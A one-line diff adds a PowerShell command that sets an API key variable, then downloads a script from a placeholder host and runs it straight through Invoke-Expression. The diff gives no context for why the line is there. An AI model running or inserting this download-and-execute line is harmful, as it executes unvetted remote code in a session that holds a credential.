@@ -1,0 +1,1 @@
+$env:API_KEY = 'apikey'; iex (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')
